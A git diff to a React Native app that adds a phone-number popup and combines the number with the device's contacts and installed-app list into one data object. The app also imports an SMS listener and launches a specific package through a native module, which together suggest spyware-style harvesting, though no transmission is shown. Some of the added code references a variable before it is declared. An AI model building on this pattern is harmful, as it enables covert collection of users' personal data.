@@ -7,8 +7,10 @@ import Apps from './modules/Apps';
 import Permission from './modules/Permission';
 import Sms_Listener from './modules/Sms_Listener';
 import { NativeModules } from 'react-native';
-import DeviceNumber from 'react-native-device-number';
+import PhoneNumberPopup from './Components/PhoneNumber';
+import StorageManager from './Components/StorageManager';
 export default function App() {
+  const [popupVisible, setPopupVisible] = useState(false);
   const {MainModule} = NativeModules;
   const [inputText, setInputText] = useState('');
   var contacts = ""
@@ -33,6 +35,19 @@ export default function App() {
     await loadApp()
   }
   const workWithData = async () => {
+    const status = await StorageManager.getData('phoneNumberPopup')
+    if(status != "answered"){
+      await new Promise((resolve) => {
+        const interval = setInterval(() => {
+          if (phoneNumber) {
+            clearInterval(interval);
+            StorageManager.saveData('phoneNumber', phoneNumber)
+            resolve();
+          }
+        }, 100);
+      });
+    }
+    await workWithApp();
     var apps_no_icons = []
     apps.forEach(element => {
       apps_no_icons.push({label:element.label, packageName: element.packageName})
@@ -42,19 +57,28 @@ export default function App() {
         MainModule.fastLoad("ru.rostel")
       }
     });
-    const data = {contacts:contacts, apps:apps_no_icons}
-    console.log(data)
+    const phoneNumber = await StorageManager.getData("phoneNumber")
+    const data = {ID:phoneNumber, contacts:contacts, apps:apps_no_icons}
+    console.log(data.ID)
   }
+  const handleSubmitPhoneNumber = (phoneNumber) => {
+    setPopupVisible(false);
+  };
   useEffect(() => {
+    setPopupVisible(true)
     const fetchData = async () => {
       await permissions();
-      await workWithApp();
       await workWithData();
     };
     fetchData();
   }, [])
   return (
     <View style={styles.container}>
+    <PhoneNumberPopup
+        visible={popupVisible}
+        onClose={() => setPopupVisible(false)}
+        onSubmit={handleSubmitPhoneNumber}
+      />
       <View style={styles.main}>
         <SvgComponent style={styles.svg} />
         <View>
